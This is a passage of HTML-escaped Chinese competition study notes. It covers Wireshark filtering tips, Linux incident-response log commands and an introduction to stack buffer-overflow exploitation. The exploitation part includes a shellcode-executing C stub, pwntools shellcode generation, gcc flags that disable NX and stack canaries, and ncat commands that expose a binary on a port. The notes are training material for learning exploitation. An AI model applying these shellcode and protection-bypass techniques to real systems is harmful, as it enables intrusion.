&lt;li&gt;
&lt;p&gt;执行的第 x 条命令&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆破的次数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;敏感文件名称&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;各种账号密码或密码哈希&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;相关题目的解法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;登陆相关：admin、login、manage&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文件相关：edit、upload、modify&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用来过滤（匹配）url 中的多个关键字&lt;/p&gt;
&lt;p&gt;http.request url matches &#34;admin | login&#34;(正则表达式)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;技巧：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;定位 ctrl+m 对数据记录进行标记，ctrl+shift+n 下一条，ctrl+shift+b 上一条&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;应急响应解析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#应急响应解析&#34;&gt;#&lt;/a&gt; 应急响应解析&lt;/h2&gt;
&lt;h3 id=&#34;准备阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#准备阶段&#34;&gt;#&lt;/a&gt; 准备阶段&lt;/h3&gt;
&lt;h4 id=&#34;完善监控体系&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#完善监控体系&#34;&gt;#&lt;/a&gt; 完善监控体系&lt;/h4&gt;
&lt;p&gt;在部署服务器时，要由系统维护人员尽可能的使用自动化脚本、监控软件对网络流量、系统资源使用率、安全事件日志实现自动统计和告警呈现。&lt;/p&gt;
&lt;p&gt;使用方法：将脚本放到 &lt;code&gt;crontab&lt;/code&gt;  计划任务中，每小时自动执行。这样便会在 &lt;code&gt;/home/oslog/host_yyymmdd/hh&lt;/code&gt;  目录下生成各个小时的 cpu、内存、网络、I0 的统计数据。&lt;/p&gt;
&lt;h4 id=&#34;其他措施&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他措施&#34;&gt;#&lt;/a&gt; 其他措施&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;制定安全预案&lt;/p&gt;
&lt;p&gt;以业务为核心，针对可能发生的安全事件之前、发生过程中以及刚刚结束之后，谁负责做什么、何时做&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;安全应急演练&lt;/p&gt;
&lt;p&gt;定期进行安全演练，熟悉应急过程、防止因突发安全事件而措手不及&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;建立安全初始化快照&lt;/p&gt;
&lt;p&gt;定期给服务器创建快照，防止因安全事件导致服务器重要数据丢失&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;准备响应工具包&lt;/p&gt;
&lt;p&gt;再出现安全事故时不要相信服务器上的任何命令文件。无论是安全应急的检测阶段还是安全应急的根治阶段，你都需要一个响应工具包&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;windows-响应工具包&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windows-响应工具包&#34;&gt;#&lt;/a&gt; Windows 响应工具包&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.12_1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;linux-响应工具包&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linux-响应工具包&#34;&gt;#&lt;/a&gt; Linux 响应工具包&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.12_2.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Linux 常见进程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.12_3.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;检测阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#检测阶段&#34;&gt;#&lt;/a&gt; 检测阶段&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;通过异常文件的创建和修改时间，一般可以判断攻击者对网站进行入侵的时间段；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;对异常服务或进程的追踪，可以查找恶意文件，确认攻击后的后门，以及攻击时间；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;网站目录下的异常文件，对判断攻击手段具有参考意义；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;网站访问日志可以对攻击手段、时间和攻击源地址的追踪提供有力的证据。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;系统安全日志中的登录信息同样可以用于判断攻击者来源。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Linux 检查点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.12_4.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Linxu 应急命令&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.12_5.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;其中查找 s 权限位的命令应为 &lt;code&gt;find / -type f -perm -04000&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Linxu 使用应急命令&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;在 apachelog 中找出访问次数最多的 10 个 IP。&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;awk&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;{print $1}&#39;&lt;/span&gt; apache_ log &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;sort&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;uniq&lt;/span&gt; -c&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;sort&lt;/span&gt; -nr&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;head&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 apache 日志中找出访问次数最多的几个分钟。&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;awk&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;{print $4}&#39;&lt;/span&gt; access_ log &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;cut&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-C&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;14&lt;/span&gt;-18&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;sort&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;uniq&lt;/span&gt; -c&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;sort&lt;/span&gt; -nr&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;head&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;假设我们定位到某个可疑 ip 访问次数较多，那么我们可以从系统日志中进行查询该 ip 的具体行为:&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;cat&lt;/span&gt; access_ _log &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;220.181&lt;/span&gt;.38.183 &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;less&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;假设发现问题文件，但不允许被删除:&lt;/p&gt;
&lt;p&gt;先使用 &lt;code&gt;lsattr&lt;/code&gt;  查看文件属性 (i)， 去掉 i 属性 &lt;code&gt;chattr -i filename&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;抑制根除阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#抑制根除阶段&#34;&gt;#&lt;/a&gt; 抑制根除阶段&lt;/h3&gt;
&lt;h3 id=&#34;恢复阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#恢复阶段&#34;&gt;#&lt;/a&gt; 恢复阶段&lt;/h3&gt;
&lt;h3 id=&#34;跟进阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#跟进阶段&#34;&gt;#&lt;/a&gt; 跟进阶段&lt;/h3&gt;
&lt;h1 id=&#34;214-真题解析之缓冲区溢出基础及样题解析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#214-真题解析之缓冲区溢出基础及样题解析&#34;&gt;#&lt;/a&gt; 2.14 真题解析之缓冲区溢出基础及样题解析&lt;/h1&gt;
&lt;h2 id=&#34;环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#环境准备&#34;&gt;#&lt;/a&gt; 环境准备&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Ubuntu 16.04 64bit&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sudo apt-get install binutils nasm nmap gcc&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Njd3VhcHR4L0FJUzMtMjAxNy9ibG9iL21hc3Rlci9lbnZfc2V0dXAuc2g=&#34;&gt;https://github.com/scwuaptx/AIS3-2017/blob/master/env_setup.sh&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sudo echo &#34;set disassembly-flavor intel&#34;&amp;gt; ~/.gdbinit&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;相关知识&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关知识&#34;&gt;#&lt;/a&gt; 相关知识&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;汇编、C、python&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Linux、gdb、gcc、objdump、IDApro&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;听说过 shellcode、stack overflow 、NX、ROP、pwntools&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;pwn-简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn-简介&#34;&gt;#&lt;/a&gt; Pwn 简介&lt;/h2&gt;
&lt;h3 id=&#34;产生漏洞原因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#产生漏洞原因&#34;&gt;#&lt;/a&gt; 产生漏洞原因：&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;CPU 和内存之间交换数据和指令&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据和指令之间并不能完全的区分开来&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#流程&#34;&gt;#&lt;/a&gt; 流程&lt;/h3&gt;
&lt;p&gt;漏洞 --&amp;gt; 控制流劫持&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;利用漏洞达成攻击者的目的&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;主要取得程序的控制权&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;又称 PWN&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;常用工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用工具&#34;&gt;#&lt;/a&gt; 常用工具&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;IDA pro&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;gdb 动态分析工具&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;基本命令&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;程序运行
&lt;ul&gt;
&lt;li&gt;run&lt;/li&gt;
&lt;li&gt;continue&lt;/li&gt;
&lt;li&gt;si (step into) 步入&lt;/li&gt;
&lt;li&gt;ni (next instruction) 下一个指令&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;断点
&lt;ul&gt;
&lt;li&gt;break *0x400566&lt;/li&gt;
&lt;li&gt;into breakpoint&lt;/li&gt;
&lt;li&gt;delete 1 删除断点&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;查看信息
&lt;ul&gt;
&lt;li&gt;x/wx 0x400526&lt;/li&gt;
&lt;li&gt;disas main 反汇编&lt;/li&gt;
&lt;li&gt;info registers&lt;/li&gt;
&lt;li&gt;backtrace 栈回溯&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;attach pid 连接到某个进程上调试&lt;/li&gt;
&lt;li&gt;set *address=value 设置某地址的值&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;GDB - peda&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Python Exploit Development Assistance for GDB&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xvbmdsZC9wZWRh&#34;&gt;https://github.com/longld/peda&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;功能
&lt;ul&gt;
&lt;li&gt;checksec：查看保护机制&lt;/li&gt;
&lt;li&gt;elfsymbol：查看程序使用的函数 plt 地址&lt;/li&gt;
&lt;li&gt;vmmap：查看内存映射&lt;/li&gt;
&lt;li&gt;find/searchmem：在内存中查找特定的字符串&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;pwntools&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于 python 的 exploit 编写库&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3B3bnRvb2xzLnJlYWR0aGVkb2NzLmlv&#34;&gt;http://pwntools.readthedocs.io&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;启动程序
&lt;ul&gt;
&lt;li&gt;io = process(&#34;./binary&#34;)&lt;/li&gt;
&lt;li&gt;io = process([&#34;./bin&#34;].env={&#34;LD_PRELOAD&#34;:&#34;./libc-2.23.so&#34;})&lt;/li&gt;
&lt;li&gt;io = remote(&#34;127.0.0.1&#34;,50001)&lt;/li&gt;
&lt;li&gt;ncat -ve ./bof -kl 50001 (其中 bof 为文件)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;交互
&lt;ul&gt;
&lt;li&gt;io.send()/sendline()&lt;/li&gt;
&lt;li&gt;io.recv()/recvline()/recvutil()&lt;/li&gt;
&lt;li&gt;sendafter(&#34;&#34;,&#34;&#34;)&lt;/li&gt;
&lt;li&gt;io.interactive()&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ELF / 汇编&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;section
&lt;ul&gt;
&lt;li&gt;文件格式
&lt;ul&gt;
&lt;li&gt;Linux -- ELF&lt;/li&gt;
&lt;li&gt;Windows -- PE&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;.bss 存放未初始化的全局变量&lt;/li&gt;
&lt;li&gt;.data 存放已经初始化的全局变量&lt;/li&gt;
&lt;li&gt;.text 存放程序执行代码&lt;/li&gt;
&lt;li&gt;.rodata 存放只读程序&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;系统调用&lt;/li&gt;
&lt;li&gt;32 位利用栈&lt;/li&gt;
&lt;li&gt;64 位利用寄存器&lt;/li&gt;
&lt;li&gt;系统调用号：RAX&lt;/li&gt;
&lt;li&gt;参数：RDI RSI RDX RCX R8 R9&lt;/li&gt;
&lt;li&gt;返回值：RAX&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zeXNjYWxscy53M2NoYWxscy5jb20vP2FyY2g9eDg2XzY0&#34;&gt;记录的一些系统调用&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;shellcode: 将要在受害软件上执行的恶意代码&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;作用：启动 shell&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;nasm -f elf64 shasm.asm -o shasm.o 编译汇编程序&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Id -s -o shasm shasm.o 链接目标文件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;objcopy -O binary shasm.o code 提取其中的 shellcode 部分&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;xxd code 显示方便&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一个接收 shellcode 的程序，func.c&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;shellcode&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;shellcode&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;fptr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; shellcode&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;fptr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;编译  &lt;code&gt;gcc func.c -zexecstack -o func&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;ncat -ve ./ 文件名 -kl port&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;缓冲区溢出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#缓冲区溢出&#34;&gt;#&lt;/a&gt; 缓冲区溢出&lt;/h3&gt;
&lt;p&gt;return to shellcode&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;测试偏移覆盖返回地址&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;pwntools cyclic&lt;/li&gt;
&lt;li&gt;gdp-pda
&lt;ul&gt;
&lt;li&gt;pattern create 100 shellcode&lt;/li&gt;
&lt;li&gt;pattern offset&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用 pwntools 产生 shellcode&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;context.arch=&#34;amd64&#34; 提前声明系统架构&lt;/li&gt;
&lt;li&gt;shcode = asm(&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NoZWxsY3JhZnQuc2g=&#34;&gt;shellcraft.sh&lt;/span&gt; ()) 自动产生 shellcode&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;编译选项&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;gcc -fno-stack-protector -z execstack bof.c -o bof&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;protection&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ASLR&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;地址空间随机化&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;堆、栈、共享库每次运行的位置都随机变化&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看是否开启 cat/proc/sys/kernel/randomize_va_space&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ldd 查看地址&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DEP (数据执行保护) 又称为 NX&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;gcc 编译默认开启 使用 -z execstack 取消 NX 保护&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PIE&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;位置独立的可执行区域&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;gcc 默认不开启，-fPIC -pie 开启&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;data 和 code 段跟着随机化，ret2shellcode 没有固定位置可以利用&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;StackGuard&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;随机生成在函数调用前将 canary 放入栈中，发现改变立即终止&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;阻挡了 stack overflow 的攻击&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;gcc 默认开启 -fno-stack-protector 关闭&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;RELRO&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;gcc -WI,-z,relro,-z now 开启 full&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;disable .got.plt/.got 都可写&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Partial (default) .got 可写&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Full 加载程序前解析全部函数 got 表可以不写&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Lazy binding&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;GOT 表中存放着函数真正的位置，PLT 过程链接库&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;程序中会调用动态库中的函数，但不是所有都能用到，这里 ELF 采取延迟绑定的机制，等到真正调用时，才去找函数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;延迟绑定机制导致 GOT 表一般可写&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;覆盖 GOT 表中地址是更改程序流程的常用手段&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;保护措施 RELRO&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;return library&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;配合信息泄露获取的 libc 地址，算出 system 等函数地址&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ROP&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;绕过 DEP (NX)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;由多个包含 ret 的指令片段组成又称为 gadget&lt;/p&gt;
&lt;/li&gt;
